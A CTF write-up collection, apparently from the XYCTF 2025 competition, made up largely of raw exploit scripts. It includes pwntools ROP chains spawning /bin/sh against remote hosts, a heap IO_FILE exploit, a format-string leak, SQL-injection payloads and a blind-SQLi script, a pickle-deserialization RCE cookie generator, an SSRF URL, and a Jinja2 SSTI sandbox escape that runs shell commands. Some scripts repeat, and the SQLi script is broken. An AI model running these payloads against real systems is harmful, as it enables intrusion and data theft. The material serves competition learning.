# 2025XYCTF writeup by Mini-Venom

> 原文: https://www.ctfiot.com/235968.html
> ID: 235968

招新小广告CTF组诚招re、crypto、pwn、misc、合约方向的师傅,长期招新IOT+Car+工控+样本分析多个组招人有意向的师傅请联系邮箱 admin@chamd5.org(带上简历和想加入的小组)

from pwn import *
from struct import pack
from ctypes import *
import base64
#from LibcSearcher import *

def debug(c = 0):
    if(c):
        gdb.attach(p, c)
    else:
        gdb.attach(p)
        pause()
def get_sb() :return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/shx00'))
#-----------------------------------------------------------------------------------------
s = lambda data : p.send(data)
sa  = lambda text,data  :p.sendafter(text, data)
sl  = lambda data   :p.sendline(data)
sla = lambda text,data  :p.sendlineafter(text, data)
r   = lambda num=4096   :p.recv(num)
rl  = lambda text   :p.recvuntil(text)
pr = lambda num=4096 :print(p.recv(num))
inter   = lambda        :p.interactive()
l32 = lambda    :u32(p.recvuntil(b'xf7')[-4:].ljust(4,b'x00'))
l64 = lambda    :u64(p.recvuntil(b'x7f')[-6:].ljust(8,b'x00'))
uu32    = lambda    :u32(p.recv(4).ljust(4,b'x00'))
uu64    = lambda    :u64(p.recv(6).ljust(8,b'x00'))
int16   = lambda data   :int(data,16)
lg= lambda s, num   :p.success('%s -> 0x%x' % (s, num))
#-----------------------------------------------------------------------------------------

context(os='linux', arch='amd64', log_level='debug')
#p = process('./pwn')
p = remote('8.147.132.32',29399)
elf = ELF('./pwn')

rdi=0x00000000004018e5
leave_ret=0x40191B
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
r()
sl(b'1')
sleep(1)
r()
sl(b'4')
sleep(1)
r()
sl(b'1')
sleep(0.5)
ret=0x40191C
bss=0x405000+0xa00
#gdb.attach(p,'b *0x4018A3 ')
sleep(0.1)
payload=b'a'*0x40+p64(bss+0x40)+p64(ret)*2+p64(0x4018A8)
s(payload)
'''
sleep(1)
gdb.attach(p,'b *0x4018A3 ')
'''
sh=0x405a00
pay=b'/bin/shx00'+p64(rdi+1)+p64(rdi)+p64(sh)+p64(elf.plt['system'])
payload=pay.ljust(0x40,b'x00')+p64(0x405a00)+p64(leave_ret)
s(payload)

inter()

结束

招新小广告

ChaMd5 Venom 招收大佬入圈

新成立组IOT+工控+样本分析 长期招新

欢迎联系admin@chamd5.org


```
from pwn import*

def bug():
    gdb.attach(p)
    pause()
def s(a):
    p.send(a)
def sa(a,b):
    p.sendafter(a,b)
def sl(a):
    p.sendline(a)
def sla(a,b):
    p.sendlineafter(a,b)
def r(a):
    p.recv(a)
#def pr(a):
    #print(p.recv(a))
def rl(a):
    return p.recvuntil(a)
def inter():
    p.interactive()
def get_addr64():
    return u64(p.recvuntil("x7f")[-6:].ljust(8,b'x00'))
def get_addr32():
    return u32(p.recvuntil("xf7")[-4:])
def get_sb():
    return libc_base+libc.sym['system'],libc_base+libc.search(b"/bin/shx00").__next__()
def get_hook():
    return libc_base+libc.sym['__malloc_hook'],libc_base+libc.sym['__free_hook']
li = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')

context(os='linux',arch='amd64',log_level='debug')
libc=ELF('./libc.so.6')   

elf=ELF('./pwn')
#p=remote('47.94.217.82',39104)
p = process('./pwn')

def add(size,content):
    rl("4. Exitn")
    sl(str(1))
    #rl("size: ")
    sleep(0.1)
    sl(str(size))
    #rl("data: ")
    sleep(0.1)
    s(content)

def free(i):
    rl("4. Exitn")
    sl(str(3))
    rl("idx: ")
    sl(str(i))
def show(i):
    rl("4. Exitn")
    sl(str(2))
    rl("idx: ")
    sl(str(i))
def exit():
    rl("4. Exitn")
    sl(str(4))

for i in range(10):
    add(0x240,b'a') # 0-9

add(0x500,b'a') # 这个用来伪造IO chunk10

for i in range(7):
    free(i)
    
free(7)
show(7)
libc_base = u64(p.recv(6).ljust(8,b'x00')) - 0x203B20
li(hex(libc_base))
IO_list_all = IO_list_all=libc_base+libc.sym['_IO_list_all']
system,bin_sh=get_sb()
setcontext=libc_base+libc.sym['setcontext']
rdi = libc_base+libc.search(asm("pop rdinret")).__next__()
rsi = libc_base+libc.search(asm("pop rsinret")).__next__()
rdx = libc_base+libc.search(asm("pop rdxnret")).__next__()
rax = libc_base+libc.search(asm("pop raxnret")).__next__()
ret = libc_base+libc.search(asm("ret")).__next__()
syscall=libc_base+libc.search(asm("syscallnret")).__next__()
open=libc_base+libc.sym['open']
read=libc_base + libc.sym['read']
write=libc_base + libc.sym['write']
free(9)
show(9)
heap_base = u64(p.recv(6).ljust(8,b'x00')) - 0x15C40
li(hex(heap_base))
tcache_chunk = heap_base + 0x15EA0
li(hex(tcache_chunk))
fake_IO_addr = heap_base + 0x16330+1296
li(hex(fake_IO_addr))
free(8)

add(0x240, b'./flagx00x00')
#bug()
free(8)
# 这里把整个unsortedbin申请出来就可以控制tcache指针了

payload = p64(0)
payload = payload.ljust(0x240, b'x00')
payload += p64(0) + p64(250)
payload += p64(IO_list_all ^ (tcache_chunk >> 12))
add(0x6e0, payload)

add(0x240, b'./flagx00x00')
add(0x240, p64(fake_IO_addr))

chunk3=fake_IO_addr # 伪造的fake_IO结构体的地址

_IO_wfile_jumps = libc_base + libc.sym['_IO_wfile_jumps']

fake_IO_FILE  =p64(0)*2+p64(1)+p64(chunk3+0x8)  
fake_IO_FILE  =fake_IO_FILE.ljust(0x60,b'x00')  
fake_IO_FILE +=p64(0)+p64(chunk3+0xf8)+p64(system) #rdi,rsi
fake_IO_FILE +=p64(heap_base)              
fake_IO_FILE +=p64(0x100)                       #rdx
fake_IO_FILE  =fake_IO_FILE.ljust(0x90, b'x00')
fake_IO_FILE +=p64(chunk3+0x8)                  #_wide_data,rax1_addr
fake_IO_FILE +=p64(chunk3+0xf0)+p64(rdi+1)      #rsp
fake_IO_FILE +=p64(0)+p64(1)+p64(0)*2
fake_IO_FILE +=p64(_IO_wfile_jumps+0x30)        # vtable=IO_wfile_jumps+0x10
fake_IO_FILE +=p64(setcontext+61)+p64(chunk3+0xc8)
fake_IO_FILE +=p64(read)

add(0x600,fake_IO_FILE) # 防止被合并 11
orw  = p64(rdi) + p64(heap_base+88576)  
orw += p64(rsi) + p64(0)
orw += p64(rax)+p64(2)+p64(syscall)

orw += p64(rdi) + p64(3)
orw += p64(rsi)+p64(heap_base+0x100)
orw += p64(read)
orw += p64(rdi) + p64(1)
orw += p64(rsi)+p64(heap_base+0x100)
orw += p64(write)

#bug()
rl("4. Exitn")
sl(str(4))

sleep(0.1)
sl(orw)

inter()
```



```
from pwn import*
from struct import pack
import ctypes
#from LibcSearcher import *
from ae64 import AE64
def bug():
        gdb.attach(p)
        pause()
def s(a):
        p.send(a)
def sa(a,b):
        p.sendafter(a,b)
def sl(a):
        p.sendline(a)
def sla(a,b):
        p.sendlineafter(a,b)
def r(a):
        p.recv(a)
#def pr(a):
        #print(p.recv(a))
def rl(a):
        return p.recvuntil(a)
def inter():
        p.interactive()
def get_addr64():
        return u64(p.recvuntil("x7f")[-6:].ljust(8,b'x00'))
def get_addr32():
        return u32(p.recvuntil("xf7")[-4:])
def get_sb():
        return libc_base+libc.sym['system'],libc_base+libc.search(b"/bin/shx00").__next__()
def get_hook():
        return libc_base+libc.sym['__malloc_hook'],libc_base+libc.sym['__free_hook']
li = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')

    
#context(os='linux',arch='i386',log_level='debug')   
context(os='linux',arch='amd64',log_level='debug')
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')   

elf=ELF('./pwn')
p=remote("8.147.132.32",16709)
#p = process('./pwn')
#gdb.attach(p,'b *0x401264')
sleep(0.1)
main=0x40127F
rsi_1=0x4010E0
rsi_2=0x4010EB
rdi=0x401180
rbp=0x000000000040117d
pay=b'b'*(0x220-4)+p32(0x220-4+1)+p64(0x400600-0x20)+p64(rsi_1)+p64(rsi_2)+p64(rdi)+p64(elf.plt['puts'])+p64(main)*221

sl(pay)

i=0
for i in range(220):
        i=i+1
        li(hex(i))
        sleep(0.2)
        s(b'n')
libc_base=get_addr64()-527952
li(hex(libc_base))
system,bin_sh=get_sb()
rdi = libc_base+libc.search(asm("pop rdinret")).__next__()
rsi = libc_base+libc.search(asm("pop rsinret")).__next__()
rdx = libc_base+libc.search(asm("pop rdxnret")).__next__()
rdx_r12= libc_base+libc.search(asm("pop rdxnpop r12nret")).__next__()
rax = libc_base+libc.search(asm("pop raxnret")).__next__()
ret = libc_base+libc.search(asm("ret")).__next__()
syscall=libc_base+libc.search(asm("syscallnret")).__next__()

#gdb.attach(p,'b *0x401264')
pause()
pay=b'b'*(0x220-4)+p32(0x220-4+1)+p64(0x400600-0x20)+p64(rdi)+p64(bin_sh)+p64(rsi)+p64(0)+p64(rdx_r12)+p64(0)*2+p64(rax)+p64(0x3b)+p64(syscall)
sl(pay)

inter()
```



```
from pwn import *  # 从 pwntools 库导入所有模块和函数
libc_path = '/lib/x86_64-linux-gnu/libc.so.6'
elf = ELF('./girlfriend')  
context.arch = 'amd64'      
context.os = 'linux'       
libc = ELF(libc_path)
context.log_level = 'debug'       # 设置日志级别为调试

# io = remote('8.147.132.32', 25071)
io = process('./girlfriend')

menu = "Your Choice:n"

def talk_her(content):# 只有一次机会
    io.sendlineafter(menu, str(1))  
    io.sendafter("what do you want to say to her?", content)  

def get_name(comment):
    io.sendlineafter(menu, str(3))  
    io.sendafter("You should tell her your name first", comment)
    io.recvuntil("your name:n")

canary_offset = 15
libc_offset = 17
elf_offset = 7

# step 1: leak canary, libc_base, elf_base
get_name("%15$p_%17$p_%7$p")
io.recvuntil("0x")
canary = int(io.recv(16),16)
io.recvuntil("0x")
libc_base = int(io.recv(12),16) - 0x29D90
io.recvuntil("0x")
elf_base = int(io.recv(12),16) - 0x18D9

bss_addr = elf_base + 0x004060
pop_rdi_ret = libc_base + 0x000000000002a3e5#: pop rdi; ret;
pop_rsi_ret = libc_base + 0x0000000000130202#: pop rsi; ret;
pop_rdx_r_ret = libc_base + 0x000000000011f2e7#: pop rdx; pop r12; ret; 
pop_rax_ret = libc_base + 0x0000000000045eb0#: pop rax; ret; 
pop_rcx_ret = libc_base + 0x000000000003d1ee#: pop rcx; ret;
syscall_ret = libc_base + 0x0000000000091316#: syscall; ret;
leave_ret = libc_base + 0x000000000004da83#: leave; ret; 
opnat_addr = libc_base + libc.sym['openat']
read_addr = libc_base + libc.sym['read']
write_addr = libc_base + libc.sym['write']
close_addr = libc_base + libc.sym['close']  

rop = flat([
    'flagx00x00x00x00', 0,
    0, 0, 
    0, 0,
    0, pop_rdi_ret, 
    0, close_addr,
    pop_rdi_ret, -100,
    pop_rsi_ret, bss_addr,
    pop_rdx_r_ret, 0x0, 0,
    opnat_addr,
    pop_rdi_ret, 0,
    pop_rdx_r_ret, 0x100, 0,
    read_addr,
    pop_rdi_ret, 1,
    pop_rdx_r_ret, 0x100, 0,
    pop_rax_ret, 1,
    write_addr,
])

get_name(rop)
payload = b'a'*0x38 + p64(canary) + p64(bss_addr+0x30) + p64(leave_ret)
talk_her(payload)

io.interactive()
```



```
from pwn import *
from struct import pack
from ctypes import *
import base64
#from LibcSearcher import *

def debug(c = 0):
    if(c):
        gdb.attach(p, c)
    else:
        gdb.attach(p)
        pause()
def get_sb() :return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/shx00'))
#-----------------------------------------------------------------------------------------
s = lambda data : p.send(data)
sa  = lambda text,data  :p.sendafter(text, data)
sl  = lambda data   :p.sendline(data)
sla = lambda text,data  :p.sendlineafter(text, data)
r   = lambda num=4096   :p.recv(num)
rl  = lambda text   :p.recvuntil(text)
pr = lambda num=4096 :print(p.recv(num))
inter   = lambda        :p.interactive()
l32 = lambda    :u32(p.recvuntil(b'xf7')[-4:].ljust(4,b'x00'))
l64 = lambda    :u64(p.recvuntil(b'x7f')[-6:].ljust(8,b'x00'))
uu32    = lambda    :u32(p.recv(4).ljust(4,b'x00'))
uu64    = lambda    :u64(p.recv(6).ljust(8,b'x00'))
int16   = lambda data   :int(data,16)
lg= lambda s, num   :p.success('%s -> 0x%x' % (s, num))
#-----------------------------------------------------------------------------------------

context(os='linux', arch='amd64', log_level='debug')
#p = process('./pwn')
p = remote('8.147.132.32',29399)
elf = ELF('./pwn')

rdi=0x00000000004018e5
leave_ret=0x40191B
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
r()
sl(b'1')
sleep(1)
r()
sl(b'4')
sleep(1)
r()
sl(b'1')
sleep(0.5)
ret=0x40191C
bss=0x405000+0xa00
#gdb.attach(p,'b *0x4018A3 ')
sleep(0.1)
payload=b'a'*0x40+p64(bss+0x40)+p64(ret)*2+p64(0x4018A8)
s(payload)
'''
sleep(1)
gdb.attach(p,'b *0x4018A3 ')
'''
sh=0x405a00
pay=b'/bin/shx00'+p64(rdi+1)+p64(rdi)+p64(sh)+p64(elf.plt['system'])
payload=pay.ljust(0x40,b'x00')+p64(0x405a00)+p64(leave_ret)
s(payload)

inter()
```



```
也就是说，system() 调用了 vfork()，产生了一个子进程 27551，然后执行了 /usr/bin/dash（shell），这就是实际去执行 echo bye~ 的地方。

接着：

arduino
复制
编辑
[Inferior 1 (process 27528) detached]
GDB 默认 分离了原来的父进程（27528），并跟踪了子进程（dash）。所以你现在调试的是 shell，而不是你原来的程序了！

然后：

lua
复制
编辑
Warning:
Cannot insert breakpoint 1.
Cannot access memory at address 0x4018a8
你尝试在 0x4018a8 处打断点，但新的进程 /usr/bin/dash 的地址空间里根本没有你的程序代码了，所以报错。

🧠 所以这是什么意思？
你已经“丢掉”了原来的程序，GDB 去跟了 /bin/dash，现在调的是 shell（而不是你想调的程序），这显然不是你想要的。

✅ 解决方案：不要让 GDB 跟踪子进程
你需要让 GDB 继续跟踪原来的程序（不要去跟踪 dash 子进程）。

执行前设置：

gdb
复制
编辑
set follow-fork-mode parent
意思是：

当遇到 fork() / vfork() 时，继续调试父进程；

不去跟踪 system() 执行出的子进程（shell）；

然后你就能继续在原来的程序里打断点、查看 system() 之后的行为。

🛠 示例操作流程
bash
复制
编辑
gdb ./your_binary
(gdb) set follow-fork-mode parent
(gdb) break *0x4018fc   # system() 调用前
(gdb) break *0x401901   # system() 返回后
(gdb) run
你就能调试完整过程了，而且不再被切换到 shell 子进程。

✅ 补充建议
如果你确实需要调子进程（比如调 shell 行为），可以用：

gdb
复制
编辑
set follow-fork-mode child
但调 CTF 或分析逻辑通常是留在父进程更合理。
```



```
from pwn import *
from struct import pack
from ctypes import *
import base64
#from LibcSearcher import *

def debug(c = 0):
    if(c):
        gdb.attach(p, c)
    else:
        gdb.attach(p)
        pause()
def get_sb() :return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/shx00'))
#-----------------------------------------------------------------------------------------
s = lambda data : p.send(data)
sa  = lambda text,data  :p.sendafter(text, data)
sl  = lambda data   :p.sendline(data)
sla = lambda text,data  :p.sendlineafter(text, data)
r   = lambda num=4096   :p.recv(num)
rl  = lambda text   :p.recvuntil(text)
pr = lambda num=4096 :print(p.recv(num))
inter   = lambda        :p.interactive()
l32 = lambda    :u32(p.recvuntil(b'xf7')[-4:].ljust(4,b'x00'))
l64 = lambda    :u64(p.recvuntil(b'x7f')[-6:].ljust(8,b'x00'))
uu32    = lambda    :u32(p.recv(4).ljust(4,b'x00'))
uu64    = lambda    :u64(p.recv(6).ljust(8,b'x00'))
int16   = lambda data   :int(data,16)
lg= lambda s, num   :p.success('%s -> 0x%x' % (s, num))
#-----------------------------------------------------------------------------------------

context(os='linux', arch='amd64', log_level='debug')
#p = process('./pwn')
p = remote('8.147.132.32',29399)
elf = ELF('./pwn')

rdi=0x00000000004018e5
leave_ret=0x40191B
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
r()
sl(b'1')
sleep(1)
r()
sl(b'4')
sleep(1)
r()
sl(b'1')
sleep(0.5)
ret=0x40191C
bss=0x405000+0xa00
#gdb.attach(p,'b *0x4018A3 ')
sleep(0.1)
payload=b'a'*0x40+p64(bss+0x40)+p64(ret)*2+p64(0x4018A8)
s(payload)
'''
sleep(1)
gdb.attach(p,'b *0x4018A3 ')
'''
sh=0x405a00
pay=b'/bin/shx00'+p64(rdi+1)+p64(rdi)+p64(sh)+p64(elf.plt['system'])
payload=pay.ljust(0x40,b'x00')+p64(0x405a00)+p64(leave_ret)
s(payload)

inter()
```



```
from pwn import*
from struct import pack
import ctypes
#from LibcSearcher import *
from ae64 import AE64
def bug():
        gdb.attach(p)
        pause()
def s(a):
        p.send(a)
def sa(a,b):
        p.sendafter(a,b)
def sl(a):
        p.sendline(a)
def sla(a,b):
        p.sendlineafter(a,b)
def r(a):
        p.recv(a)
#def pr(a):
        #print(p.recv(a))
def rl(a):
        return p.recvuntil(a)
def inter():
        p.interactive()
def get_addr64():
        return u64(p.recvuntil("x7f")[-6:].ljust(8,b'x00'))
def get_addr32():
        return u32(p.recvuntil("xf7")[-4:])
def get_sb():
        return libc_base+libc.sym['system'],libc_base+libc.search(b"/bin/shx00").__next__()
def get_hook():
        return libc_base+libc.sym['__malloc_hook'],libc_base+libc.sym['__free_hook']
li = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')

context(log_level = 'debug',arch = 'mips',endian = 'little')
#p = process(["qemu-mipsel","-g","9000","-L","./","./pwn"]) #开启9000端口
p = remote('39.106.69.240',20611)
elf = ELF('./pwn')

payload = b'a' * 36
payload += p32(0x00400a20)
payload += b'bbbb'
payload += p32(0x00400B70)
payload += p32(0x00411010)
p.sendafter(">", payload)

inter()
```



```
username=admin'%09OR%09substring(database()%09FROM%092%09FOR%091)='e'%23&password=1
```



```
Python
import requests
import time

url = ""

flag = ""

for pos in range(1, 31):
    a = False
    for str in range(32, 127):
        payload = f"admin'%09OR%09case%09when%09("ascii(substring((select%09secret%09from%09double_check%09limit%091)%09FROM%09{pos}%09FOR%091))={ascii_code})%09then%091%09else%090%09end=1%23"
        data = {
            "username":payload,
            "password":'1'
        }
        try:
            res = requests.post(url, data=payload,allow_redirects=False, timeout=3)
            if res.status_code == 302:
                a = True
                result += chr(str)
                break
        except Exception as e:
            print("error")

        time.sleep(0.5)

    if not a:
        break
print("flag:", flag)
```



```
from bottle import Bottle, request, response,run, route

app = Bottle()

class cmd():
    def __reduce__(self):
        return (exec,("__import__('os').popen('cat /f*>>/app/app/app.py').read()",))

@route('/secret')
def secret_page():
    c = cmd()
    session = {"name":c}
    response.set_cookie("name", session,secret="Hell0_H@cker_Y0u_A3r_Sm@r7")
    

run(host='127.0.0.1', port=8081, debug=False)
```



```
?url=@2130706433:8080/1337
```



```
req = binary_to_string(req)
                print(req)
                req = json.loads(req) # No one can hack it, right? Pickle unserialize is not secure, but json is ;)
```



```
def binary_to_string(binary_string):
    if len(binary_string) % 8 != 0:
        raise ValueError("Binary string length must be a multiple of 8")
    binary_chunks = [binary_string[i:i+8] for i in range(0, len(binary_string), 8)]
    string_output = ''.join(chr(int(chunk, 2)) for chunk in binary_chunks)
```



```
Fate = [
    ('JOHN', '1994-2030 Dead in a car accident'),
    ('JANE', '1990-2025 Lost in a fire'),
    ('SARAH', '1982-2017 Fired by a government official'),
    ('DANIEL', '1978-2013 Murdered by a police officer'),
    ('LUKE', '1974-2010 Assassinated by a military officer'),
    ('KAREN', '1970-2006 Fallen from a cliff'),
    ('BRIAN', '1966-2002 Drowned in a river'),
    ('ANNA', '1962-1998 Killed by a bomb'),
    ('JACOB', '1954-1990 Lost in a plane crash'),
    ('LAMENTXU', r'2024 Send you a flag flag{FAKE}')
]
```



```
{"name":{"admin')))))))or 1 order by 1 DESC-- ":"a"}}
```



```
011110110010001001101110011000010110110101100101001000100011101001111011001000100110000101100100011011010110100101101110001001110010100100101001001010010010100100101001001010010010100101101111011100100010000000110001001000000110111101110010011001000110010101110010001000000110001001111001001000000011000100101101001011010010000000100010001110100010001001100010001000100111110101111101
```



```
?url=@2130706433:8080/1337?0=%61%62%63%64%65%66%67%68%69&1=011110110010001001101110011000010110110101100101001000100011101001111011001000100110000101100100011011010110100101101110001001110010100100101001001010010010100100101001001010010010100101101111011100100010000000110001001000000110111101110010011001000110010101110010001000000110001001111001001000000011000100101101001011010010000000100010001110100010001001100010001000100111110101111101
```



```
类似隐写，记事本打开，源码
# YOU FOUND ME ;)
# -*- encoding: utf-8 -*-
'''
@File    :   src.py
@Time    :   2025/03/29 01:10:37
@Author  :   LamentXU 
'''
import flask
import sys
enable_hook =  False
counter = 0
def audit_checker(event,args):
    global counter
    if enable_hook:
        if event in ["exec", "compile"]:
            counter += 1
            if counter > 4:
                raise RuntimeError(event)

lock_within = [
    "debug", "form", "args", "values", 
    "headers", "json", "stream", "environ",
    "files", "method", "cookies", "application", 
    'data', 'url' ,''', '"', 
    "getattr", "_", "{{", "}}", 
    "[", "]", "\", "/","self", 
    "lipsum", "cycler", "joiner", "namespace", 
    "init", "dir", "join", "decode", 
    "batch", "first", "last" , 
    " ","dict","list","g.",
    "os", "subprocess",
    "g|a", "GLOBALS", "lower", "upper",
    "BUILTINS", "select", "WHOAMI", "path",
    "os", "popen", "cat", "nl", "app", "setattr", "translate",
    "sort", "base64", "encode", "\u", "pop", "referer",
    "The closer you see, the lesser you find."] 
        # I hate all these.
app = flask.Flask(__name__)
@app.route('/')
def index():
    return 'try /H3dden_route'
@app.route('/H3dden_route')
def r3al_ins1de_th0ught():
    global enable_hook, counter
    name = flask.request.args.get('My_ins1de_w0r1d')
    if name:
        try:
            if name.startswith("Follow-your-heart-"):
                for i in lock_within:
                    if i in name:
                        return 'NOPE.'
                enable_hook = True
                a = flask.render_template_string('{#'+f'{name}'+'#}')
                enable_hook = False
                counter = 0
                return a
            else:
                return 'My inside world is always hidden.'
        except RuntimeError as e:
            counter = 0
            return 'NO.'
        except Exception as e:
            return 'Error'
    else:
        return 'Welcome to Hidden_route!'

if __name__ == '__main__':
    import os
    try:
        import _posixsubprocess
        del _posixsubprocess.fork_exec
    except:
        pass
    import subprocess
    del os.popen
    del os.system
    del subprocess.Popen
    del subprocess.call
    del subprocess.run
    del subprocess.check_output
    del subprocess.getoutput
    del subprocess.check_call
    del subprocess.getstatusoutput
    del subprocess.PIPE
    del subprocess.STDOUT
    del subprocess.CalledProcessError
    del subprocess.TimeoutExpired
    del subprocess.SubprocessError
    sys.addaudithook(audit_checker)
    app.run(debug=False, host='0.0.0.0', port=5000)

python沙箱逃逸ssti，用config.update写进config，目的是把全局变量都写入config,这样引用只需要config就行，request的mimetype属性绕过下划线，%09绕过空格，{%%}要用set语句赋值
{%25set%09x=config%25}{%25set%09a=x.update(cmd=request.mimetype)%25}{%25print(x|attr(x.cla)|attr(x.i)|attr(x.glo))%}读取到__globals__
```



```
payload:
?My_ins1de_w0r1d=Follow-your-heart-{%25set%09x=config%25}{%25set%09a=x.update(cmd=request.mimetype)%25}{%25print(x|attr(x.cla)|attr(x.in)|attr(x.glo)|attr(x.gett)(x.bul)|attr(x.gett)(x.ev)(x.cmd))%25} 
Content-Type:__import__("subprocess").getoutput('cat /flag_h3r3 >static/1.txt')//先mkdir static
```



```
from pwn import *
from tqdm import *
from mt19937predictor import MT19937Predictor
predictor = MT19937Predictor()
o=remote("47.94.172.18",28759)
o.recvline()
o.recvline()
o.recvline()
o.recvline()
o.recvline()
o.recvline()
o.recv()
for i in trange(624):
    o.sendline(b"1")
    o.recv()
    o.sendline(b"1")
    k=int(o.recv().split(b"=")[1])
    predictor.setrandbits(k, 32)
    o.recv()
o.sendline(b"2")
print(o.recv())
rand1=predictor.getrandbits(11000)
rand2=predictor.getrandbits(10000)
correct_ans = rand1 // rand2
o.sendline(str(correct_ans))
print(o.recv())
print(o.recv())
```



```
import itertools
from Crypto.Cipher import ChaCha20
import hashlib

def small_roots(f, bounds, m=1, d=None):
    ifnot d:
        d = f.degree()

    R = f.base_ring()
    N = R.cardinality()

    f /= f.coefficients().pop(0)
    f = f.change_ring(ZZ)

    G = Sequence([], f.parent())
    for i in range(m + 1):
        base = N ^ (m - i) * f ^ i
        for shifts in itertools.product(range(d), repeat=f.nvariables()):
            g = base * prod(map(power, f.variables(), shifts))
            G.append(g)

    B, monomials = G.coefficient_matrix()
    monomials = vector(monomials)

    factors = [monomial(*bounds) for monomial in monomials]
    for i, factor in enumerate(factors):
        B.rescale_col(i, factor)

    B = B.dense_matrix().LLL()

    B = B.change_ring(QQ)
    for i, factor in enumerate(factors):
        B.rescale_col(i, 1 / factor)

    H = Sequence([], f.parent().change_ring(QQ))
    for h in filter(None, B * monomials):
        H.append(h)
        I = H.ideal()
        if I.dimension() == -1:
            H.pop()
        elif I.dimension() == 0:
            roots = []
            for root in I.variety(ring=ZZ):
                root = tuple(R(root[var]) for var in f.variables())
                roots.append(root)
            return roots
    return []

n = 24240993137357567658677097076762157882987659874601064738608971893024559525024581362454897599976003248892339463673241756118600994494150721789525924054960470762499808771760690211841936903839232109208099640507210141111314563007924046946402216384360405445595854947145800754365717704762310092558089455516189533635318084532202438477871458797287721022389909953190113597425964395222426700352859740293834121123138183367554858896124509695602915312917886769066254219381427385100688110915129283949340133524365403188753735534290512113201932620106585043122707355381551006014647469884010069878477179147719913280272028376706421104753
mh = [3960604425233637243960750976884707892473356737965752732899783806146911898367312949419828751012380013933993271701949681295313483782313836179989146607655230162315784541236731368582965456428944524621026385297377746108440938677401125816586119588080150103855075450874206012903009942468340296995700270449643148025957527925452034647677446705198250167222150181312718642480834399766134519333316989347221448685711220842032010517045985044813674426104295710015607450682205211098779229647334749706043180512861889295899050427257721209370423421046811102682648967375219936664246584194224745761842962418864084904820764122207293014016, 15053801146135239412812153100772352976861411085516247673065559201085791622602365389885455357620354025972053252939439247746724492130435830816513505615952791448705492885525709421224584364037704802923497222819113629874137050874966691886390837364018702981146413066712287361010611405028353728676772998972695270707666289161746024725705731676511793934556785324668045957177856807914741189938780850108643929261692799397326838812262009873072175627051209104209229233754715491428364039564130435227582042666464866336424773552304555244949976525797616679252470574006820212465924134763386213550360175810288209936288398862565142167552]
C = [5300743174999795329371527870190100703154639960450575575101738225528814331152637733729613419201898994386548816504858409726318742419169717222702404409496156167283354163362729304279553214510160589336672463972767842604886866159600567533436626931810981418193227593758688610512556391129176234307448758534506432755113432411099690991453452199653214054901093242337700880661006486138424743085527911347931571730473582051987520447237586885119205422668971876488684708196255266536680083835972668749902212285032756286424244284136941767752754078598830317271949981378674176685159516777247305970365843616105513456452993199192823148760, 21112179095014976702043514329117175747825140730885731533311755299178008997398851800028751416090265195760178867626233456642594578588007570838933135396672730765007160135908314028300141127837769297682479678972455077606519053977383739500664851033908924293990399261838079993207621314584108891814038236135637105408310569002463379136544773406496600396931819980400197333039720344346032547489037834427091233045574086625061748398991041014394602237400713218611015436866842699640680804906008370869021545517947588322083793581852529192500912579560094015867120212711242523672548392160514345774299568940390940653232489808850407256752]
enc = b'x9cxc4nx8dFxd9x9exf4x05x82!xdexfex012$xd0x8cxafxfbrEb(x04)xa1xa6xbaI2Jxd2xb2x898x11xe6xxa9x19x00pnxf6rs- xd2xd1xbexc7xf51.xd4xd2 xe7xc6xcaxe5x19xbe'
PR.< x,y > = PolynomialRing(Zmod(n))
f1=((mh[0]+x)^3-3*(mh[0]+x)*(mh[1]+y)^2)-C[0]
res=small_roots(f1,bounds=(2^128,2^128),m=1,d=3)
print(ChaCha20.new(key=hashlib.sha256(str(res[0][0]+mh[0]+mh[1] +res[0][1]).encode()).digest(), nonce=b'Pr3d1ctmyxjj').decrypt(enc))
# XYCTF{Welcome_to_XYCTF_Now_let_us_together_play_Crypto_challenge}
```



```
def crc64(data, prev=0xFFFFFFFFFFFFFFFF):
    POLY = 0x42F0E1EBA9EA3693
    crc = prev
    for byte in data:
        crc ^= (byte << 56)
        for _ in range(8):
            top_bit = crc >> 63
            crc = (crc << 1) & 0xFFFFFFFFFFFFFFFF
            if top_bit:
                crc ^= POLY
    return ~crc & 0xFFFFFFFFFFFFFFFF

enc = [
    0xDC63E34E419F7B47,
    0x031EF8D4E7B2BFC6,
    0x12D62FBC625FD89E,
    0x83E8B6E1CC5755E8,
    0xFC7BB1EB2AB665CC,
    0x9382CA1B2A62D96B,
    0xB1FFF8A07673C387,
    0x0DA81627388E05E1,
    0x9EF1E61AE8D0AAB7,
    0x92783FD2E7F26145,
    0x63C97CA1F56FE60B,
    0x9BD3A8B043B73AAB,
]
flag = bytearray()
for i in enc:
    found = False
    for b1 in range(256):
        for b2 in range(256):
            block = bytes([b1, b2])
            crc = crc64(block)
            if crc == i:
                flag.extend(block)
                found = True
                break
        if found:
            break
print(flag.decode())
#
```



```
import moon
help(moon)

enc = "426b87abd0ceaa3c58761bbb0172606dd8ab064491a2a76af9a93e1ae56fa84206a2f7"
data = bytes.fromhex(enc)
flag = moon.xor_crypt(1131796, data)
print(flag)
#b'flag{but_y0u_l00k3d_up_@t_th3_mOOn}'
```



```
import re

def extract_bf_segments(code):
    # 用正则找到所有包含 `[-]` 的部分，去除 `[-]`
    segments = re.split(r'[-]', code)
    return segments

def run_segment(segment):
    tape = [0] * 30000
    ptr = 0
    ip = 0
    output_log = []
    brackets = {}
    stack = []

    # 构建匹配括号表
    for i, c in enumerate(segment):
        if c == '[':
            stack.append(i)
        elif c == ']':
            start = stack.pop()
            brackets[start] = i
            brackets[i] = start

    while ip < len(segment):
        cmd = segment[ip]
        if cmd == '>':
            ptr += 1
        elif cmd == '<':
            ptr -= 1
        elif cmd == '+':
            tape[ptr] = (tape[ptr] + 1) % 256
        elif cmd == '-':
            tape[ptr] = (tape[ptr] - 1) % 256
        elif cmd == '[':
